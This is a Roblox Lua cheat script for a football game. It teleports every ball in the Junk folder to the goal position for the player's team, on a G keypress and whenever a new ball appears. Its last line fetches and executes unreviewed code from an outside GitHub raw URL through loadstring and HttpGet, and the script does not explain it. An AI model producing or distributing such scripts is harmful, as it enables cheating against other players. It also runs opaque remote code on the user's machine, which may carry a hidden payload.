print "start load script"
--G gol

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer

-- Function to find all footballs in the Junk folder
local function findBalls()
    local junkFolder = Workspace:FindFirstChild("Junk")
    local balls = {}
    if junkFolder then
        for _, obj in pairs(junkFolder:GetChildren()) do
            if obj:IsA("Part") and obj.Name == "Football" then
                table.insert(balls, obj)
            end
        end
    end
    return balls
end

-- Function to teleport all balls to a "very hard" position based on the player's team
local function teleportAllBalls()
    local targetPosition = nil

    -- Check player's team and set "very hard" target positions
    if Player.Team then
        if Player.Team.Name == "Home" then
            targetPosition = Vector3.new(2.010676682, 4.00001144, -186.170898)  -- Home team's "very hard" position
        elseif Player.Team.Name == "Away" then
            targetPosition = Vector3.new(-0.214612424, 4.00001144, 186.203613)  -- Away team's "very hard" position
        end
    end

    if targetPosition then
        local balls = findBalls()
        if #balls > 0 then
            for _, ball in pairs(balls) do
                ball.CFrame = CFrame.new(targetPosition) -- Teleport the ball to the "very hard" position
            end
        else
            warn("Not found ball")  -- If no balls are found
        end
    else
        warn("-")  -- If no target position is set
    end
end

-- Function to handle reset and player respawn
local function onPlayerRespawned()
    -- Wait for the character to fully load
    local character = Player.Character or Player.CharacterAdded:Wait()
    -- Wait for necessary parts to load before teleporting
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

    -- Ensure we teleport balls after the character is fully loaded
    teleportAllBalls()

    -- Detect when new footballs are added (after player reset)
    Workspace.ChildAdded:Connect(function(child)
        if child:IsA("Part") and child.Name == "Football" then
            teleportAllBalls()  -- Teleport new footballs to their target position
        end
    end)
end

-- Trigger the teleportation when the user presses 'G'
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.G then
        teleportAllBalls()
    end
end)

-- Connect to the player's respawn event
Player.CharacterAdded:Connect(function(character)
    -- After respawn, call onPlayerRespawned to make sure the balls are in position
    onPlayerRespawned()
end)

-- Detect ball reset and re-teleport balls if any are added
Workspace.ChildAdded:Connect(function(child)
    if child:IsA("Part") and child.Name == "Football" then
        -- If a new football is added (e.g., on respawn), teleport it to the target position
        teleportAllBalls()
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTHINGx555/load/refs/heads/main/.lua"))()
print "end load script"
